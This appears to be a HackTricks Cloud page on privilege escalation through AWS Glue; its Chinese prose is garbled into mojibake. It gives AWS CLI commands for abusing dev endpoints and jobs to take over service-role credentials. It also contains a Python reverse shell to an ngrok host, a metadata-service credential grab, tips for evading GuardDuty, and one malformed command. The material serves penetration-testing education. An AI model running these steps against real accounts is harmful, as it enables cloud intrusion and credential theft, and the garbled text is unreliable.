# AWS - Glueæƒé™æå‡

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## glue

### `iam:PassRole`, `glue:CreateDevEndpoint`, (`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

å…·æœ‰`iam:PassRole`å’Œ`glue:CreateDevEndpoint`æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„AWS Glueå¼€å‘ç«¯ç‚¹ï¼Œå¹¶å°†ç°æœ‰çš„æœåŠ¡è§’è‰²ä¼ é€’ç»™å®ƒ**ã€‚ç„¶åï¼Œä»–ä»¬å¯ä»¥é€šè¿‡SSHè¿æ¥åˆ°å®ä¾‹ï¼Œå¹¶ä½¿ç”¨AWS CLIè®¿é—®è§’è‰²å…·æœ‰çš„æƒé™ã€‚
```
aws glue create-dev-endpoint --endpoint-name my_dev_endpoint \
--role-arn arn_of_glue_service_role \
--public-key file:///path/to/my/public/ssh/key.pub
```
ç°åœ¨æ”»å‡»è€…åªéœ€è¦**SSHè¿›å…¥å¼€å‘ç«¯ç‚¹**å°±å¯ä»¥è®¿é—®è§’è‰²å‡­è¯ã€‚
```bash
# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
å³ä½¿åœ¨GuardDutyæ–‡æ¡£ä¸­æ²¡æœ‰æ˜ç¡®æŒ‡å‡ºï¼Œä»Glueå®ä¾‹ä¸­æ³„éœ²å‡­æ®æ˜¯ä¸€ä¸ªåä¸»æ„ã€‚ç›¸åï¼Œåº”è¯¥ç›´æ¥ä»æ–°å®ä¾‹ä¸­è®¿é—®AWS APIã€‚

æ½œåœ¨å½±å“ï¼šç‰¹æƒå‡çº§åˆ°æŒ‡å®šçš„GlueæœåŠ¡è§’è‰²ã€‚

### `glue:UpdateDevEndpoint`ï¼Œ(`glue:GetDevEndpoint` | `glue:GetDevEndpoints`)

å…·æœ‰`glue:UpdateDevEndpoint`æƒé™çš„æ”»å‡»è€…å°†èƒ½å¤Ÿæ›´æ–°ç°æœ‰Glueå¼€å‘ç«¯ç‚¹çš„å…³è”SSHå…¬é’¥ï¼Œç„¶åé€šè¿‡SSHè®¿é—®å®ƒï¼Œå¹¶è·å¾—é™„åŠ è§’è‰²å…·æœ‰çš„æƒé™ã€‚
```bash
# Change public key to connect
aws glue --endpoint-name target_endpoint \
--public-key file:///path/to/my/public/ssh/key.pub

# Get the public address of the instance
## You could also use get-dev-endpoints
aws glue get-dev-endpoint --endpoint-name privesctest

# SSH with the glue user
ssh -i /tmp/private.key ec2-54-72-118-58.eu-west-1.compute.amazonaws.com
```
ç°åœ¨æ”»å‡»è€…åªéœ€è¦**SSHè¿›å…¥å¼€å‘ç«¯ç‚¹ä»¥è®¿é—®è§’è‰²å‡­è¯**ã€‚åº”è¯¥ç›´æ¥ä»æ–°å®ä¾‹è®¿é—®AWS APIï¼Œä»¥é¿å…è§¦å‘è­¦æŠ¥ã€‚

**æ½œåœ¨å½±å“ï¼š**ç‰¹æƒå‡çº§åˆ°ä½¿ç”¨çš„GlueæœåŠ¡è§’è‰²ã€‚

### `iam:PassRole`ï¼Œ(`glue:CreateJob` | `glue:UpdateJob`)ï¼Œ(`glue:StartJobRun` | `glue:CreateTrigger`)

å…·æœ‰è¿™äº›æƒé™çš„æ”»å‡»è€…å¯ä»¥**åˆ›å»º/æ›´æ–°ä¸€ä¸ªä½œä¸šå¹¶é™„åŠ ä»»ä½•GlueæœåŠ¡å¸æˆ·**ï¼Œç„¶åå¯åŠ¨å®ƒã€‚è¯¥ä½œä¸šå¯ä»¥æ‰§è¡Œä»»æ„çš„Pythonä»£ç ï¼Œå› æ­¤å¯ä»¥è·å¾—åå‘shellï¼Œå¹¶ç”¨äº**çªƒå–é™„åŠ è§’è‰²çš„IAMå‡­è¯**ã€‚
```bash
# Content of the python script saved in s3:
#import socket,subprocess,os
#s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#s.connect(("2.tcp.ngrok.io",11216))
#os.dup2(s.fileno(),0)
#os.dup2(s.fileno(),1)
#os.dup2(s.fileno(),2)
#p=subprocess.call(["/bin/sh","-i"])
#To get the IAM Role creds run: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy


# A Glue role with admin access was created
aws glue create-job \
--name privesctest \
--role arn:aws:iam::93424712358:role/GlueAdmin \
--command '{"Name":"pythonshell", "PythonVersion": "3", "ScriptLocation":"s3://airflow2123/rev.py"}'

# You can directly start the job
aws glue start-job-run --job-name privesctest
# Or you can create a trigger to start it
aws glue create-trigger --name triggerprivesc --type SCHEDULED \
--actions '[{"JobName": "privesctest"}]' --start-on-creation \
--schedule "0/5 * * * * *"  #Every 5mins, feel free to change
```
**æ½œåœ¨å½±å“ï¼š**ç‰¹æƒå‡çº§åˆ°æŒ‡å®šçš„GlueæœåŠ¡è§’è‰²ã€‚

### `glue:UpdateJob`

ä»…å‡­å€Ÿæ›´æ–°æƒé™ï¼Œæ”»å‡»è€…å°±å¯ä»¥çªƒå–å·²é™„åŠ è§’è‰²çš„IAMå‡­è¯ã€‚

**æ½œåœ¨å½±å“ï¼š**ç‰¹æƒå‡çº§åˆ°å·²é™„åŠ çš„GlueæœåŠ¡è§’è‰²ã€‚

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆçš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
